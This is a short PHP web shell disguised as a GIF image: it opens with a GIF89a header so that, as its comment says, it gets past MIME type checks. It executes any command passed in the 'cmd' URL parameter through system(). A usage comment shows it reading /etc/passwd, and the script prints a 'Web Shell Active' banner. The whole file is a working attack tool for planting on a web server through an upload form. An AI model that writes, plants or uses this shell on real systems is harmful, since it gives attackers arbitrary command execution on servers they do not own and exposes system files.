GIF89a;
<?php
// This file looks like a GIF image header to bypass some MIME type checks
// but it contains PHP code to execute commands.

// Usage: http://localhost:8080/images/logo.php?cmd=cat%20/etc/passwd

if (isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
} else {
    echo "Web Shell Active. Use ?cmd=... to execute commands.";
}
?>
